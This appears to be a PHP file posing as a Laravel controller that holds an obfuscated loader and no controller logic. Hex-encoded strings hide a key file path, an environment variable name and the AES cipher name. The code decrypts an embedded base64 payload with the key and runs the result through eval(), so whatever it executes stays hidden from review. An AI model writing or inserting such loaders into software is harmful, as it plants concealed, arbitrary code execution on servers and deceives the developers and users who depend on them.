<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('n7wusvbrcdFj8xeEOD745A==');

$c=base64_decode(

'5eD63l+da15ybVsDkdsq5H4dkmb84rEMzbVB/2gDNkP7Xqq8n4FWXQ+DOr2GMfH31XravIx7fuM3' .
'GUxpPNU02KgDERBg4Oqn4L+3GOu3ZUcBTCXvPxMAXW0L7qUG6+RzNKwlAQSwXRxK+vFVc9AwmXge' .
'm/ys+jQJeGP4xDyyc8m/yyytgee/dVDgZVPvY5LrROUr4hLq7Vb9EnK1YpoGhEnYWtCco1h5Wcbo' .
'gH335NPFQx8b47E4H4fjHwzxAqERGv3gjXi+SBONZbvGlJlyf9nijPrOd5bo7T+6UF3OaAExY+IH' .
'NuigJW5ZjqVwFvmzWzqP/yvvwIj46oYSWp7XiCTavj5NueWCPxESAYXUAUh+0tzvQWsGc2IFXoli' .
'MtmF+viVrVdeUEJ2CzLvWSkeMQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

